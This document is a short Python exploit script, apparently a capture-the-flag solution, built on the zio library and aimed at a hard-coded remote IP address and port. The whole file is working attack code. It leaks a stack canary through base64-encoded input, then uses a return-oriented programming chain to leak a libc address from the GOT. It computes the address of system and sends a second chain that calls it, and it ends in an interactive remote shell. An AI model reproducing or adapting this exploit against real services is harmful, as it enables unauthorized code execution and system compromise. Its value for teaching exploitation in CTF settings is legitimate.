from zio import *
import base64

target = (('120.55.86.95',44444))
io = zio(target, timeout=1,print_read=COLORED(REPR,'red'),print_write=COLORED(REPR,'green'))

io.writeline("6f78f333c8d330c8726d510efc28d9a1")
io.writeline("Y")
io.writeline("UWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrPT1Ra0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDUWtKQ1FrSkNRa0pDY")
io.read_until("B"*49)
sc = "\x00"+io.read(7)

base = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJC"

pop_rdi = l64(0x400e93)
addr_libc_start_main = l64(0x602048)

next = base64.b64encode(sc + l64(0)+pop_rdi+addr_libc_start_main+l64(0x4007c0))

pd = base + next

payload = base64.b64encode(pd + ("A"*(120-len(pd))))+"Y"

io.writeline(payload)
io.read_until("B"*48)

start_addr = l64(io.read(6)+"\x00\x00")
system = start_addr + 0x24870
param = start_addr + 0x15af0b

next = base64.b64encode(sc + l64(0)+pop_rdi+l64(param)+l64(system))

pd = base + next

payload = base64.b64encode(pd + ("A"*(120-len(pd))))+"Y"
io.writeline(payload)
io.interact()
